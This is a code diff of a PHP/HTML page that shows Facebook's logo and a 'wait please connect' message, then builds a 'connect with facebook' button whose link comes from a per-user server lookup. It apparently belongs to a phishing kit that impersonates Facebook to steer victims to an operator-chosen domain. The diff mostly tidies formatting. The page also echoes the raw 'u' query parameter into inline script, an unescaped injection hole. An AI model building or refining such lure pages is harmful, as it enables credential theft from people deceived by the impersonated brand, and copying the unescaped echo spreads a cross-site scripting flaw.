@@ -82,24 +82,23 @@
     <div class="container">
         <img width="150" id="loggo" style="margin-top: 0;" src="https://download.logo.wine/logo/Facebook/Facebook-Logo.wine.png">
     <div class="btn" id="btn"  style="margin-top: 160px; margin-bottom: 100%;">
-		<h3 id="wait" style="color: rgb(44, 128, 211);">wait please connect... </h3ß>
-	</div>
+	    <h3 id="wait" style="color: rgb(44, 128, 211);">wait please connect... </h3ß>
+    </div>
 	 
     </div>
-    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     <script>
       const queryString = window.location.search;
       const urlParams = new URLSearchParams(queryString);
       const u = urlParams.get("u");
 	    
-    axios.get("/data/<?php echo $_GET['u'] ?>").then((resps) =>
-      {
-        document.getElementById('wait').style.display= "none";
-	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
-    }).catch((e)=>{
-		  console.log(e)
-	  });
+    axios.get("/data/<?php echo $_GET['u'] ?>").then((resps) => {
+	    document.getElementById('wait').style.display= "none";
+	    document.getElementById('btn').innerHTML = `<a href=${resps.data.domain} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`;
+    })
+    .catch((e)=> {
+	    console.log(e);
+    });
     </script>
   </body>
 </html>
